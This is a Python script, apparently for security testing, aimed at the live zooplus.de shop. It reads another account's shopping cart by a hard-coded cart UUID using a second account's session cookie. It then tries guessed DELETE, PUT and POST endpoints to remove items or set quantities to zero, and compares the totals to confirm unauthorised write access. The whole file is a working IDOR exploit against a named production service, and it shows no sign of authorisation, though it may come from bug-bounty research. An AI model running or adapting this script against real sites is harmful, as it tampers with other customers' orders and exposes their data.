#!/usr/bin/env python3
"""
Test IDOR: Modify foreign cart (remove items, change quantity)
This script attempts to modify Account A's cart from Account B's session.
"""

import requests
import json
import sys

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

# Account B session cookie (need to get from browser)
# Format: "zooplus/6607d90f-fdc2-4387-9b63-1c8feb71250a/d5f7640b-6e48-4364-9fc3-beedf7ca94f2"
SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_idor_modify.py <session_cookie>")
    print("[!] Example: python3 test_cart_idor_modify.py 'zooplus/xxx/yyy'")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print(f"[*] Testing IDOR: Modify foreign cart")
print(f"[*] Target cart UUID: {CART_UUID}")
print(f"[*] Using session: {SESSION_COOKIE[:50]}...")
print()

# Step 1: Read cart (baseline)
print("[*] Step 1: Reading cart (baseline)")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
print(f"[+] HTTP {r.status_code}")

if r.status_code != 200:
    print(f"[!] Failed to read cart: {r.text[:200]}")
    sys.exit(1)

cart_data = r.json()
articles = cart_data.get("articles", [])
before_count = len(articles)
before_total = cart_data.get("summary", {}).get("grandTotal", 0)

print(f"[+] Cart has {before_count} items")
print(f"[+] Grand total: {before_total} EUR")
print(f"[+] Customer ID in cart: {cart_data.get('cartId', 'N/A')}")

if not articles:
    print("[!] No articles in cart to modify")
    sys.exit(1)

# Get first article ID
first_article = articles[0]
article_id = first_article.get("id")
article_name = first_article.get("name", "Unknown")
print(f"[+] First article: {article_name} (ID: {article_id})")
print()

# Step 2: Try to remove item (DELETE)
print("[*] Step 2: Attempting to DELETE article")
delete_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{article_id}",
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/items/{article_id}",
    f"/checkout/api/cart-api/v1/cart/{CART_UUID}/articles/{article_id}",
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/article/{article_id}",
]

delete_success = False
for endpoint in delete_endpoints:
    print(f"[*] Trying DELETE: {endpoint}")
    r = requests.delete(f"{BASE_URL}{endpoint}", headers=headers)
    print(f"    HTTP {r.status_code}")
    
    if r.status_code in [200, 204]:
        print(f"[!!!] SUCCESS: Item deleted via DELETE!")
        print(f"    Response: {r.text[:200]}")
        delete_success = True
        break
    elif r.status_code == 403:
        print(f"    [X] Forbidden (protected)")
    elif r.status_code == 404:
        print(f"    [X] Not found (wrong endpoint)")
    else:
        print(f"    Response: {r.text[:200]}")

print()

# Step 3: Try to update quantity (PUT/PATCH)
print("[*] Step 3: Attempting to update quantity (PUT)")
put_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{article_id}",
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/items/{article_id}",
    f"/checkout/api/cart-api/v1/cart/{CART_UUID}/articles/{article_id}",
]

put_success = False
for endpoint in put_endpoints:
    # Try quantity = 0 (remove)
    print(f"[*] Trying PUT: {endpoint} (quantity=0)")
    payload = {"quantity": 0}
    r = requests.put(f"{BASE_URL}{endpoint}", headers=headers, json=payload)
    print(f"    HTTP {r.status_code}")
    
    if r.status_code == 200:
        print(f"[!!!] SUCCESS: Quantity updated via PUT!")
        print(f"    Response: {r.text[:300]}")
        put_success = True
        break
    elif r.status_code == 403:
        print(f"    [X] Forbidden (protected)")
    elif r.status_code == 404:
        print(f"    [X] Not found (wrong endpoint)")
    else:
        print(f"    Response: {r.text[:200]}")

print()

# Step 4: Try POST to remove
print("[*] Step 4: Attempting POST to remove item")
post_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/articles/{article_id}/remove",
    f"/checkout/api/cart-api/v2/cart/{CART_UUID}/remove",
    f"/checkout/api/cart-api/v1/cart/{CART_UUID}/remove",
]

post_success = False
for endpoint in post_endpoints:
    print(f"[*] Trying POST: {endpoint}")
    payload = {"articleId": article_id} if "remove" in endpoint else {"articles": [{"id": article_id, "quantity": 0}]}
    r = requests.post(f"{BASE_URL}{endpoint}", headers=headers, json=payload)
    print(f"    HTTP {r.status_code}")
    
    if r.status_code in [200, 204]:
        print(f"[!!!] SUCCESS: Item removed via POST!")
        print(f"    Response: {r.text[:300]}")
        post_success = True
        break
    elif r.status_code == 403:
        print(f"    [X] Forbidden (protected)")
    elif r.status_code == 404:
        print(f"    [X] Not found (wrong endpoint)")
    else:
        print(f"    Response: {r.text[:200]}")

print()

# Step 5: Verify cart after modification
print("[*] Step 5: Verifying cart after modification attempts")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)

if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    
    print(f"[+] Cart now has {after_count} items")
    print(f"[+] Grand total: {after_total} EUR")
    
    if before_count != after_count or before_total != after_total:
        print()
        print("[!!!] ========================================")
        print("[!!!] IDOR CONFIRMED: Cart was modified!")
        print("[!!!] ========================================")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")
        print()
        print("[!!!] This proves write access to foreign cart!")
    else:
        print("[!] Cart unchanged - modification endpoints may be protected")
        print("[!] But read access (IDOR) is still confirmed")
else:
    print(f"[!] Failed to verify: HTTP {r.status_code}")

print()
print("[*] Test complete")

